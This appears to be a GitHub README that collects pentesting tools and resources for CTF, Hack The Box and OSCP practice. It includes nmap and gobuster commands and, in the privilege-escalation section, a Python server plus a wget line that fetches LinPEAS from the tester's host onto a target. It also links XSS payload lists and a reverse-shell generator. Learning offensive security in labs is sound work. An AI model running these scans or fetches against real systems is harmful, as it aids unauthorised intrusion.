# cow-tools

![](https://upload.wikimedia.org/wikipedia/en/thumb/9/9a/Cow_Tools_cartoon.png/220px-Cow_Tools_cartoon.png)

A collection of the pentesting tools and resources I've found and made use of over the years, and maybe some of my own!?

Many of these tools are prebuilt into Kali, and will not need to be installed.

## VMs
- [Kali VMWare](https://www.kali.org/get-kali/#kali-virtual-machines) - Easy images for VM usage. I prefer this over everything and I've frequently wiped VMs with utter disregard.

## General Resources
- [HackTricks](https://book.hacktricks.wiki/en/index.html) - My favorite general hacking wiki. Has awesome documentation for many attack vectors.
- [HackTricks Cloud](https://cloud.hacktricks.wiki/en/index.html) - Hacktricks, but for cloud! Good docs on things like CI/CD, Terraform, and Kubernetes.
- [IppSec](https://www.youtube.com/@ippsec) - Great Youtube channel with HTB writeups. Nice to look at as retros after box completion.
- [Exploit DB](https://exploit-db.com) - List of exploits and PoCs, perfect for when you find a vulnerable service.

## Recon & Discovery
- [Nmap](https://nmap.org/) - A classic and mainstay. Most useful and easiest to work with port and network scanner.
  > Very aggro scan: `$ nmap -sS -A -T 5 10.0.0.0`
  >
  > More calm scan: `$ nmap -sS 10.0.0.0`
  >
  > All ports: `$ nmap -sS 10.0.0.0 -p-`
- [Gobuster](https://github.com/OJ/gobuster) - Web app fuzzer, I get a crazy amount of use out of this one. Great for subdomain and dir enumeration.
  > Directory discovery: `$ gobuster dir http://site.htb --wordlist /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
  >
  > Subdomain/VHost discovery: `$ gobuster vhost --append-domain http://site.htb --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt`
- [WhatWeb](https://github.com/urbanadventurer/WhatWeb) - Web app scanner, useful for finding vulnerable versions of software hosting the webapp.

## Web App
- [Burp Suite](https://portswigger.net/burp) - Web app proxy and repeater for easy introspection and modification of HTTP requests.
- [JWT.io](https://jwt.io) - JWT token parsing and decoding, great for finding token injection parameters or low RSA N values to crack.
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list) - Useful list of common XSS payloads.
- [MITMProxy](https://mitmproxy.org/) - Easy HTTP proxy for port forwarding a localhost webserver.
- [Reverse Shell Generator](https://www.revshells.com/) - Easy way to get a shell made, has many options for style and encoding.

## SQLi
- [SQLMap](https://sqlmap.org/) - Aggressive SQLi finder. Do not use this outside of CTF/OSCP/HTB.

## Scripting
- [PWNTools](https://docs.pwntools.com/en/stable/) - Python library for automating binary exploitation scripts and other CTF related tasks.

## Cryptography
- [HashCat](https://hashcat.net/wiki/doku.php?id=example_hashes) - Hash cracking tool for a variety of hashes.
- [CyberChef](https://gchq.github.io/CyberChef/) - Best online encoding and text parsing. Useful for base64, parsing certs, etc.
- [CrackStation](https://crackstation.net/) - Cached cracked passwords, easy for simple ones like SHA256 and MD5 that may have been popped in breaches. Great for HTB.
- [RSACTFTool](https://github.com/RsaCtfTool/RsaCtfTool) - RSA breaking tool, great for ciphers with weak N values.
- [Alpertron's Integer Factorization Calculator](https://www.alpertron.com.ar/ECM.HTM) - Easily factorize massive integers with elliptic curve or quadtratic sieve.

## Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists) - Favorite wordlists! This has all kinds of stuff for web fuzzing, local directories, etc.
- [RockYou2021](https://github.com/ohmybahgosh/RockYou2021.txt) - Big collected wordlist featuring seclists, crackstation, and more.
- [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule) - Massive Hashcat cracking rule for special password combo attacks.

## Privelege Escalation

### OS Agnostic
- Python HTTP Server - I get a crazy ammount of use out of this to pull down files from my box.
  > Start server: `$ python3 -m http.server 80`
  >
  > Pull file: `wget http://10.10.14.7/linpeas.sh`

### Linux
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) - Privesc automation script. Easily find curious things to exploit.
- [GTFOBins](https://gtfobins.github.io/) - Easily exploitable bins to live off the land with. Good for finding SUID exploits.

### Windows
- [WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md) - Windows privesc automation script. Easily find curious things to exploit.
- [LOLBas](https://lolbas-project.github.io/) - Live off the land with local Windows scripts to get priveleged.
